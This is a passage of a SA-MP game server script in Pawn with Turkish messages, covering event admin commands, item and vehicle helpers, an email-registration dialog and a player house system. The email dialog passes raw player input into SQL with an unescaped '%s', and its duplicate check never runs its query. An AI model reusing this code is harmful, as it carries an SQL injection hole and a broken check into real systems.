 	if(!strcmp(params, "cek", true, 3)) {
        if(sscanf(params[3 + 1], "u", params[0])) return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk cek [playerid] '");
		if(!(IsPlayerConnected(params[0]))) {
		    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Geçersiz playerid '");
		}
		new
		    Float: g_iPos[3];
		if(GetPlayerPos(playerid, g_iPos[0], g_iPos[1], g_iPos[2])) {
			if(IsPlayerInRangeOfPoint(params[0], 25.0, g_iPos[0], g_iPos[1], g_iPos[2])) {
				SetPlayerPos(params[0], g_iPos[0] + 1, g_iPos[1], g_iPos[2]);
   				SendClientMessage(params[0], -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yönetici {FFDB00}%s {ee5555}sizi yanýnýza çekti '", GetName(playerid)));
			}
			SendClientMessage(playerid, -1, formatEx("{ee5555}<!> {FFFFFF}Etkinlik - {ee5555}' Yanýnýzdaki {FFDB00}%s {ee5555}isimli oyuncuyu çektiniz '", GetName(params[0])));
		}
		return 1;
	}

	return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk [baslat, say, kill, spawn, skin, cash, score, can, zirh, dondur, coz, ...] '"), SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Doðru kullaným - {ee5555}' /etk [..., sirala, eject, cek, silah, cevir, arac(sil), disarm] '");
}

CMD:etkcik(playerid, params[]) {
	if(!(g_Flags[playerid] & e_Play)) {
	    return SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Hata - {ee5555}' Herhangibir etkinlikte deðilsiniz '");
	}

	g_Flags[playerid] &= ~e_Play;
	SetPlayerHealth(playerid, -1);
	new Yazi[1024];
	SendClientMessage(playerid, -1, "{ee5555}<!> {FFFFFF}Bildiri - {ee5555}' Etkinlikten ayrýldýnýz '");
	format(Yazi, 1024, "ETK'dan ayrýldý");
    SqlLogYaz(playerid, 8, Yazi);
	return 1;
}

stock IsValidWeapon(const iWeaponID) {
	return (0 < iWeaponID < 19 || 21 < iWeaponID < 47);
}

stock GetWeaponID(const szWeapon[]) {
	static
		szTemp[32]
	;
	for(new i = 0; i < 47; i++) {
		switch(i) {
			case 0, 19..21: continue;
			default: {
				GetWeaponName(i, szTemp, sizeof(szTemp));

				if(strfind(szTemp, szWeapon, true) != -1) {
					return i;
				}
			}
		}
	}
	return -1;
}

stock GetVehicleID(const szVehicle[]) {
	for(new i, j = sizeof(VehNames); i != j; ++i) {
	    if(strfind(VehNames[i], szVehicle, true) != -1) {
	        return i + 400;
	    }
	}
	return -1;
}

stock IsVehicleInRangeOfPoint(iVehID, Float: fRad, Float: fX, Float: fY, Float: fZ) {
	return !!(GetVehicleDistanceFromPoint(iVehID, fX, fY, fZ) < fRad);
}

stock IsValidSkin(const iSkinID) {
	if(0 <= iSkinID <= 299) {
		switch(iSkinID) {
			case 3..6, 8, 42, 65, 74, 86, 119, 149, 208, 273, 289: {
				return 0;
			}
		}
		return 1;
	}
	return 0;
}


stock IsABike(vehicleid)
{
	new result;
	new model = GetVehicleModel(vehicleid);
    switch(model)
    {
        case 509, 481, 510, 462, 448, 581, 522, 461, 521, 523, 463, 586, 468, 471: result = model;
        default: result = 0;
    }
	return result;
}

public OnDialogResponse(playerid, dialogid, response, listitem, inputtext[])
{
	if(dialogid == 25478)
	{
	    if(!response)
        {
            Kick(playerid);
        }
        else 
        {
            if(strlen(inputtext) > 0)
            {
                if(strfind(inputtext, "@", true) == -1)
				{
				    return ShowPlayerDialog(playerid, 25478, DIALOG_STYLE_INPUT, "Mail Kayýtý", "Lütfen geçerli bir mail giriniz!!\nLütfen mail adresini giriniz!\nMail adresiniz admin tarafýndan kontrol edilecektir!", "Kaydet", "Kick");
				}
				else if(strfind(inputtext, ".", true) == -1)
				{
					return ShowPlayerDialog(playerid, 25478, DIALOG_STYLE_INPUT, "Mail Kayýtý", "Lütfen geçerli bir mail giriniz!!\nLütfen mail adresini giriniz!\nMail adresiniz admin tarafýndan kontrol edilecektir!", "Kaydet", "Kick");
				}
				
				new query[256], rows;
				mysql_format(Connection, query, sizeof(query), "SELECT playerMail FROM oyuncular WHERE playerMail = '%s'", inputtext);
				rows = cache_num_rows();

				if(rows)
				{
				    return ShowPlayerDialog(playerid, 25478, DIALOG_STYLE_INPUT, "Mail Kayýtý", "Girdiðiniz mail daha önceden kullanýlmýþ!!\nLütfen mail adresini giriniz!\nMail adresiniz admin tarafýndan kontrol edilecektir!", "Kaydet", "Kick");
				}
				
				new Yazi[128];
				format(Yazi, 128, "Mail adresinizi %s olarak kaydettiniz", inputtext);
				SendClientMessage(playerid, 0xff00ffff, Yazi);
				format(APlayerData[playerid][playerMail], 128, inputtext);

                mysql_format(Connection, query, sizeof(query), "UPDATE `oyuncular` SET `playerMail` = '%s' WHERE `Nick` = '%s'", inputtext, GetName(playerid));
				mysql_query(Connection, query);
            }
            else
            {
                ShowPlayerDialog(playerid, 25478, DIALOG_STYLE_INPUT, "Mail Kayýtý", "Boþ geçmeyelim!\nLütfen mail adresini giriniz!\nMail adresiniz admin tarafýndan kontrol edilecektir!", "Kaydet", "Kick");
			}
            
            
        }
        return 1;
	}

/*	if(dialogid == 2548)
    {
        if(response)
        {
            switch(listitem)
            {
                case 0: // Kola
                {
                    if(APlayerData[playerid][PlayerMoney] < 200) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
					if(pSusuzluk[playerid] > 90)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 10.0);
                    SendClientMessage(playerid, -1, "{55FF00} $200 ödeyerek Kola içtiniz.");
                    RewardPlayer(playerid, -200, 0);
                }
                case 1: // Ayran
                {
                    if(APlayerData[playerid][PlayerMoney] < 140) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pSusuzluk[playerid] > 97)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 3.0);
                    SendClientMessage(playerid, -1, "{55FF00} $140 ödeyerek Ayran içtiniz.");
                    RewardPlayer(playerid, -140, 0);
                }
                case 2: // Fanta
                {
                    if(APlayerData[playerid][PlayerMoney] < 200) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pSusuzluk[playerid] > 88)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 12.0);
                    SendClientMessage(playerid, -1, "{55FF00} $200 ödeyerek Fanta içtiniz.");
                    RewardPlayer(playerid, -200, 0);
                }
                case 3: // Þalgam Suyu
                {
                    if(APlayerData[playerid][PlayerMoney] < 180) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pSusuzluk[playerid] > 87)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 13.0);
                    SendClientMessage(playerid, -1, "{55FF00} $180 ödeyerek Þalgam Suyu içtiniz.");
                    RewardPlayer(playerid, -180, 0);
                }
                case 4: // Su
                {
                    if(APlayerData[playerid][PlayerMoney] < 50) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pSusuzluk[playerid] > 98)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 5.0);
                    SendClientMessage(playerid, -1, "{55FF00} $50 ödeyerek Su içtiniz.");
                    RewardPlayer(playerid, -50, 0);
                }
                case 5: // Yedigün
                {
                    if(APlayerData[playerid][PlayerMoney] < 110) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pSusuzluk[playerid] > 88)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 12.0);
                    SendClientMessage(playerid, -1, "{55FF00} $110 ödeyerek Yedigün içiniz.");
                    RewardPlayer(playerid, -110, 0);
                }
                case 6: // Sprite
                {
                    if(APlayerData[playerid][PlayerMoney] < 230) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pSusuzluk[playerid] > 91)return SendClientMessage(playerid, 0xFF000FFF, "Bu içecek susuzluðuna fazla gelir!");
					susuzlukArttir(playerid, 20.0);
                    SendClientMessage(playerid, -1, "{55FF00} $230 ödeyerek Sprite içiniz.");
                    RewardPlayer(playerid, -230, 0);
                }
                
            }
        }
        return 1;
    }
	
    if(dialogid == 2549)
    {
        if(response)
        {
            switch(listitem)
            {
                case 0: // Hamburger
                {
                    if(APlayerData[playerid][PlayerMoney] < 450) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 92)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 8.0);
                    SendClientMessage(playerid, -1, "{55FF00} $450 ödeyerek hamburger yediniz.");
                    RewardPlayer(playerid, -450, 0);
                }
                case 1: // Sosis
                {
                    if(APlayerData[playerid][PlayerMoney] < 200) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 96)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
				    aclikArttir(playerid, 4.0);
                    SendClientMessage(playerid, -1, "{55FF00} $200 ödeyerek Sosis yediniz.");
                    RewardPlayer(playerid, -200, 0);
                }
                case 2: // Patso
                {
                    if(APlayerData[playerid][PlayerMoney] < 250) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 90)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 10.0);
                    SendClientMessage(playerid, -1, "{55FF00} $250ödeyerek Patso yediniz.");
                    RewardPlayer(playerid, -250, 0);
                }
                case 3: // Tost
                {
                    if(APlayerData[playerid][PlayerMoney] < 100) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 97)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 4.0);
                    SendClientMessage(playerid, -1, "{55FF00} $100 ödeyerek Tost yediniz.");
                    RewardPlayer(playerid, -100, 0);
                }
                case 4: // Pizza
                {
                    if(APlayerData[playerid][PlayerMoney] < 220) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 87)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 13.0);
                    SendClientMessage(playerid, -1, "{55FF00} $220 ödeyerek Pizza yediniz.");
                    RewardPlayer(playerid, -220, 0);
                }
                case 5: // Lahmacun
                {
                    if(APlayerData[playerid][PlayerMoney] < 112) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 86)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 14.0);
                    SendClientMessage(playerid, -1, "{55FF00} $112 ödeyerek Lahmacun yediniz.");
                    RewardPlayer(playerid, -112, 0);
                }
                case 6: // Tavuk Döner
                {
                    if(APlayerData[playerid][PlayerMoney] < 70) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 90)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 10.0);
                    SendClientMessage(playerid, -1, "{55FF00} $70 ödeyerek Tavuk Döner yediniz.");
                    RewardPlayer(playerid, -70, 0);
                }
                case 7: // Et Döner
                {
                    if(APlayerData[playerid][PlayerMoney] < 110) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 85)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 15.0);
                    SendClientMessage(playerid, -1, "{55FF00} $110 ödeyerek Et Döner yediniz.");
                    RewardPlayer(playerid, -110, 0);
                }
                case 8: // Pilav
                {
                    if(APlayerData[playerid][PlayerMoney] < 80) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 95)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 5.0);
                    SendClientMessage(playerid, -1, "{55FF00} $80 ödeyerek Pilav yediniz.");
                    RewardPlayer(playerid, -80, 0);
                }
                case 9: // Adana Kebap
                {
                    if(APlayerData[playerid][PlayerMoney] < 350) return SendClientMessage(playerid, -1, "{FF000F}Yeterli paraya sahip deðilsin!");
                    if(pAclik[playerid] > 75)return SendClientMessage(playerid, 0xFF000FFF, "Bu yiyecek açlýðýna fazla gelir!");
					aclikArttir(playerid, 25.0);
                    SendClientMessage(playerid, -1, "{55FF00} $350 ödeyerek Adana Kebap yediniz.");
                    RewardPlayer(playerid, -350, 0);
                }
            }
        }
        return 1;
    }
*/

	// Ev Sistemi [ Reiss_Umut ]
	if(dialogid == DIALOG_BUY_HOUSE)
		{
			if(!response) return 1;
			new id = GetPVarInt(playerid, "PickupHouseID");
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ])) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evin yakýnýnda deðilsin.");
	        #if LIMIT_PER_PLAYER > 0
			if(OwnedHouses(playerid) + 1 > LIMIT_PER_PLAYER) return SendClientMessage(playerid, 0xE74C3CFF, "Daha fazla ev alamazsýn.");
			#endif
			if(HouseData[id][Price] > APlayerData[playerid][PlayerMoney]) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evi almaya paran yetmiyor.");
			if(strcmp(HouseData[id][Owner], "-")) return SendClientMessage(playerid, 0xE74C3CFF, "Bu ev baþkasýna ait!");
			//GivePlayerMoney(playerid, -HouseData[id][Price]);
			RewardPlayer(playerid, -HouseData[id][Price], 0);
			GetPlayerName(playerid, HouseData[id][Owner], MAX_PLAYER_NAME);
			HouseData[id][LastEntered] = gettime();
			HouseData[id][Save] = true;
			SaveHouse(id);
            GivePlayerAchievement(playerid, EvimAch, 1);
            
			UpdateHouseLabel(id);
			Streamer_SetIntData(STREAMER_TYPE_PICKUP, HouseData[id][HousePickup], E_STREAMER_MODEL_ID, 19522);
			Streamer_SetIntData(STREAMER_TYPE_MAP_ICON, HouseData[id][HouseIcon], E_STREAMER_TYPE, 32);
			SendToHouse(playerid, id);
			return 1;
		}

		if(dialogid == DIALOG_HOUSE_PASSWORD)
		{
		    if(!response) return 1;
		    new id = GetPVarInt(playerid, "PickupHouseID");
			if(!IsPlayerInRangeOfPoint(playerid, 2.0, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ])) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evin yakýnýnda deðilsin.");
			if(!(1 <= strlen(inputtext) <= MAX_HOUSE_PASSWORD)) return ShowPlayerDialog(playerid, DIALOG_HOUSE_PASSWORD, DIALOG_STYLE_INPUT, "Ev Þifresi", "Bu ev þifre korumalý.\n\nÞifre giriniz:\n\n{E74C3C}Girdiðiniz parola ya çok kýsa ya da çok uzun.", "Tekrar Dene", "Kapat");
			if(strcmp(HouseData[id][Password], inputtext)) return ShowPlayerDialog(playerid, DIALOG_HOUSE_PASSWORD, DIALOG_STYLE_INPUT, "House Password", "Bu ev þifre korumalý.\n\nÞifre giriniz:\n\n{E74C3C}Hatalý þifre.", "Tekrar Dene", "Kapat");
			SendToHouse(playerid, id);
			return 1;
		}

		if(dialogid == DIALOG_HOUSE_MENU)
		{
		    if(!response) return 1;
		    new id = InHouse[playerid];
		    if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");

			if(listitem == 0) ShowPlayerDialog(playerid, DIALOG_HOUSE_NAME, DIALOG_STYLE_INPUT, "Evin adý", "Evin yeni adýný gir:", "Deðiþtir", "Geri");
			if(listitem == 1) ShowPlayerDialog(playerid, DIALOG_HOUSE_NEW_PASSWORD, DIALOG_STYLE_INPUT, "Evin þifresi", "Evin yeni þifresini gir:", "Deðiþtir", "Geri");
			if(listitem == 2) ShowPlayerDialog(playerid, DIALOG_HOUSE_LOCK, DIALOG_STYLE_LIST, "Ev Kilit", "Kilit Yok\nÞifre Kilidi\nAnahtarlý\nSadece Ev Sahibi", "Deðiþtir", "Geri");
			if(listitem == 3)
			{
			    if(HouseData[id][SalePrice] > 0)
				{
					SendClientMessage(playerid, 0xE74C3CFF, "Evin satýþý için ise bu özelliði kullanabilirsiniz.");
					return ShowHouseMenu(playerid);
				}

			    new string[144];
			    format(string, sizeof(string), "Kasadan para almak {2ECC71}($%s)\nKasaya para koymak {2ECC71}($%s)\nGeçmiþi Görüntüle\nGeçmiþi Temizle", convertNumber(HouseData[id][SafeMoney]), convertNumber(APlayerData[playerid][PlayerMoney]));
				ShowPlayerDialog(playerid, DIALOG_SAFE_MENU, DIALOG_STYLE_LIST, "Ev Güvenliði", string, "Seç", "Geri");
			}
/*
			if(listitem == 4)
			{
			    if(HouseData[id][SalePrice] > 0)
				{
					SendClientMessage(playerid, 0xE74C3CFF, "Evin satýþý için ise bu özelliði kullanabilirsiniz.");
					return ShowHouseMenu(playerid);
				}

				ShowPlayerDialog(playerid, DIALOG_FURNITURE_MENU, DIALOG_STYLE_LIST, "Mobilyalar", "Mobilya Satýnal\nMobilyalarý Düzenle\nMobilya Satmak\nTüm mobilyalarý sat", "Seç", "Geri");
			}
*/
			//if(listitem == 5) ShowPlayerDialog(playerid, DIALOG_GUNS_MENU, DIALOG_STYLE_LIST, "Silahlar", "Silah Koy\nSilah Al", "Seç", "Geri");
	        if(listitem == 4)
			{
			    ListPage[playerid] = 0;
				ShowPlayerDialog(playerid, DIALOG_VISITORS_MENU, DIALOG_STYLE_LIST, "Ziyaretçiler", "Ziyaretçi geçmiþine bak\nZiyaretçi geçmiþini temizle", "Seç", "Geri");
			}

			if(listitem == 5)
			{
			    ListPage[playerid] = 0;
				ShowPlayerDialog(playerid, DIALOG_KEYS_MENU, DIALOG_STYLE_LIST, "Anahtarlar", "Evin anahtarlarýna bak\nAnahtarlarý deðiþtir", "Seç", "Geri");
			}

			if(listitem == 6)
			{
			    new string[128];
			    format(string, sizeof(string), "Evin sahibi %s herkesi evinden attý.", HouseData[id][Owner]);

				foreach(new i : Player)
				{
				    if(i == playerid) continue;
				    if(InHouse[i] == id)
				    {
			            SetPVarInt(i, "HousePickupCooldown", gettime() + HOUSE_COOLDOWN);
			        	SetPlayerVirtualWorld(i, 0);
				        SetPlayerInterior(i, 0);
				        SetPlayerPos(i, HouseData[id][houseX], HouseData[id][houseY], HouseData[id][houseZ]);
				        InHouse[i] = INVALID_HOUSE_ID;
				        SendClientMessage(i, -1, string);
				    }
				}

				SendClientMessage(playerid, -1, "Eve gelen herkes tekmeledin.");
			}

			if(listitem == 7)
			{
			    new string[128];
			    format(string, sizeof(string), "Anýnda sat\t{2ECC71}$%s\n%s", convertNumber(floatround(HouseData[id][Price]*0.85)), (HouseData[id][SalePrice] > 0) ? ("Satýþtan Kaldýr") : ("Satýþa Koy"));
				ShowPlayerDialog(playerid, DIALOG_SELL_HOUSE, DIALOG_STYLE_TABLIST, "Sell House", string, "Seç", "Geri");
			}

			return 1;
		}

		if(dialogid == DIALOG_HOUSE_NAME)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(!(1 <= strlen(inputtext) <= MAX_HOUSE_NAME)) return ShowPlayerDialog(playerid, DIALOG_HOUSE_NAME, DIALOG_STYLE_INPUT, "Evin Adý", "Evinizin yeni adýný giriniz:\n\n{E74C3C}Girilen isim ya çok kýsa ya da çok uzun.", "Deðiþtir", "Geri");
	        format(HouseData[id][HOName], MAX_HOUSE_NAME, "%s", inputtext);
	        HouseData[id][Save] = true;

	        UpdateHouseLabel(id);
	        ShowHouseMenu(playerid);
		    return 1;
		}

		if(dialogid == DIALOG_HOUSE_NEW_PASSWORD)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(!(1 <= strlen(inputtext) <= MAX_HOUSE_PASSWORD)) return ShowPlayerDialog(playerid, DIALOG_HOUSE_NEW_PASSWORD, DIALOG_STYLE_INPUT, "Ev Þifresi", "Yeni ev þifresi giriniz:\n\n{E74C3C}Girilen þifre ya çok kýsa ya da çok uzun.", "Change", "Back");
	        format(HouseData[id][Password], MAX_HOUSE_PASSWORD, "%s", inputtext);
	        HouseData[id][Save] = true;
	        ShowHouseMenu(playerid);
		    return 1;
		}

		if(dialogid == DIALOG_HOUSE_LOCK)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			HouseData[id][LockMode] = listitem;
			HouseData[id][Save] = true;

			UpdateHouseLabel(id);
	        ShowHouseMenu(playerid);
		    return 1;
		}

		if(dialogid == DIALOG_SAFE_MENU)
		{
		    if(!response) return ShowHouseMenu(playerid);
		    new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(HouseData[id][SalePrice] > 0) return SendClientMessage(playerid, 0xE74C3CFF, "Evin satýþý için ise bu özelliði kullanabilirsiniz.");
			if(listitem == 0) ShowPlayerDialog(playerid, DIALOG_SAFE_TAKE, DIALOG_STYLE_INPUT, "Kasa: Parayý Al", "Kasadan almak istediðiniz miktarý giriniz:", "Al", "Geri");
			if(listitem == 1) ShowPlayerDialog(playerid, DIALOG_SAFE_PUT, DIALOG_STYLE_INPUT, "Kasa: Para Koy", "Kasaya koymak istediðiniz miktarý giriniz:", "Koy", "Geri");
	        if(listitem == 2)
	        {
				ListPage[playerid] = 0;

	            new query[200], Cache: safelog;
			    mysql_format(Connection, query, sizeof(query), "SELECT Type, Amount, FROM_UNIXTIME(Date, '%%d/%%m/%%Y %%H:%%i') as TransactionDate FROM housesafelogs WHERE HouseID=%d ORDER BY Date DESC LIMIT 0, 15", id);
				safelog = mysql_query(Connection, query);
				new rows = cache_num_rows();
				if(rows) {
				    new list[1024], date[20];
				    format(list, sizeof(list), "Eylem\tTarih\n");
					new tstype, tsamount;
				    for(new i; i < rows; ++i)
				    {
			        	cache_get_value_name(i, "TransactionDate", date);
                        cache_get_value_name_int(i, "Type", tstype);
                        cache_get_value_name_int(i, "Amount", tsamount);
				        format(list, sizeof(list), "%s%s $%s\t{FFFFFF}%s\n", list, TransactionNames[ tstype ], convertNumber(tsamount), date);
				    }

				    ShowPlayerDialog(playerid, DIALOG_SAFE_HISTORY, DIALOG_STYLE_TABLIST_HEADERS, "Kasa geçmiþi (Page 1)", list, "Sonraki", "Önceki");
				}else{
					SendClientMessage(playerid, 0xE74C3CFF, "Hiç geçmiþ bulunamadý");
				}

			    cache_delete(safelog);
	        }

	        if(listitem == 3)
			{
			    new query[64];
			    mysql_format(Connection, query, sizeof(query), "DELETE FROM housesafelogs WHERE HouseID=%d", id);
	    		mysql_tquery(Connection, query, "", "");
	    		ShowHouseMenu(playerid);
			}

			return 1;
		}

		if(dialogid == DIALOG_SAFE_TAKE)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(HouseData[id][SalePrice] > 0) return SendClientMessage(playerid, 0xE74C3CFF, "Evin satýþý için ise bu özelliði kullanabilirsiniz.");
	        new amount = strval(inputtext);
			if(!(1 <= amount <= 10000000)) return ShowPlayerDialog(playerid, DIALOG_SAFE_TAKE, DIALOG_STYLE_INPUT, "Kasa: Para al", "Kasadan almak istediðiniz miktarý giriniz:\n\n{E74C3C}Geçersiz tutar.", "Al", "Geri");
			if(amount > HouseData[id][SafeMoney]) return ShowPlayerDialog(playerid, DIALOG_SAFE_TAKE, DIALOG_STYLE_INPUT, "Kasa: Para koy", "Kasaya koymak istediðiniz miktarý giriniz:\n\n{E74C3C}Kasada o kadar para yok.", "Al", "Geri");
	        new query[128];
			mysql_format(Connection, query, sizeof(query), "INSERT INTO housesafelogs SET HouseID=%d, Type=0, Amount=%d, Date=UNIX_TIMESTAMP()", id, amount);
			mysql_tquery(Connection, query, "", "");

			//GivePlayerMoney(playerid, amount);
			RewardPlayer(playerid, amount, 0);
			HouseData[id][SafeMoney] -= amount;
			HouseData[id][Save] = true;
			ShowHouseMenu(playerid);
		    return 1;
		}

		if(dialogid == DIALOG_SAFE_PUT)
		{
		    if(!response) return ShowHouseMenu(playerid);
	        new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
	        new amount = strval(inputtext);
			if(!(1 <= amount <= 10000000)) return ShowPlayerDialog(playerid, DIALOG_SAFE_PUT, DIALOG_STYLE_INPUT, "Kasa: Para Koy", "Kasaya koymak istediðiniz miktarý giriniz:\n\n{E74C3C}Geçersiz miktar.", "Koy", "Geri");
			if(amount > APlayerData[playerid][PlayerMoney]) return ShowPlayerDialog(playerid, DIALOG_SAFE_PUT, DIALOG_STYLE_INPUT, "Kasa: Para Koy", "Kasaya koymak istediðiniz miktarý giriniz:\n\n{E74C3C}Gidiðiniz miktar kadar paranýz bulunmamakta..", "Koy", "Geri");
	        new query[128];
			mysql_format(Connection, query, sizeof(query), "INSERT INTO housesafelogs SET HouseID=%d, Type=1, Amount=%d, Date=UNIX_TIMESTAMP()", id, amount);
			mysql_tquery(Connection, query, "", "");

			//GivePlayerMoney(playerid, -amount);
			RewardPlayer(playerid, -amount, 0);
			HouseData[id][SafeMoney] += amount;
			HouseData[id][Save] = true;
			ShowHouseMenu(playerid);
		    return 1;
		}

		if(dialogid == DIALOG_GUNS_MENU)
		{
			if(!response) return ShowHouseMenu(playerid);
			new id = InHouse[playerid];
	        if(id == INVALID_HOUSE_ID) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir evde deðilsin.");
			if(strcmp(HouseData[id][Owner], GetName(playerid))) return SendClientMessage(playerid, 0xE74C3CFF, "Bu evin sahibi deðilsin.");
			if(listitem == 0)
			{
				if(GetPlayerWeapon(playerid) == 0) return SendClientMessage(playerid, 0xE74C3CFF, "Herhangi bir silahýn yok.");
				new query[128], weapon = GetPlayerWeapon(playerid), ammo = GetPlayerAmmo(playerid);
	            RemovePlayerWeapon(playerid, weapon);
				mysql_format(Connection, query, sizeof(query), "INSERT INTO houseguns VALUES (%d, %d, %d) ON DUPLICATE KEY UPDATE Ammo=Ammo+%d", id, weapon, ammo, ammo);
				mysql_tquery(Connection, query, "", "");
				ShowHouseMenu(playerid);
			}

			if(listitem == 1)
			{
			    new query[80], Cache: weapons;
			    mysql_format(Connection, query, sizeof(query), "SELECT WeaponID, Ammo FROM houseguns WHERE HouseID=%d ORDER BY WeaponID ASC", id);
				weapons = mysql_query(Connection, query);
				new rows = cache_num_rows();
				if(rows) {
				    new list[512], weapname[32];
				    format(list, sizeof(list), "#\tSilah Adý\tMermi\n");
				    new ewpid, ewpammo;
				    for(new i; i < rows; ++i)
				    {
				        cache_get_value_name_int(i, "WeaponID", ewpid);
				        cache_get_value_name_int(i, "Ammo", ewpammo);
				        GetWeaponName(ewpid, weapname, sizeof(weapname));
				        format(list, sizeof(list), "%s%d\t%s\t%s\n", list, i+1, weapname, convertNumber(ewpammo));
				    }

				    ShowPlayerDialog(playerid, DIALOG_GUNS_TAKE, DIALOG_STYLE_TABLIST_HEADERS, "Evdeki Silahlar", list, "Al", "Geri");
				}else{
					SendClientMessage(playerid, 0xE74C3CFF, "Senin evinde herhangi bir silah yok.");
				}

			    cache_delete(weapons);
			}

			return 1;
		}

		if(dialogid == DIALOG_GUNS_TAKE)
		{
			if(!response) return ShowHouseMenu(playerid);
			new id = InHouse[playerid];
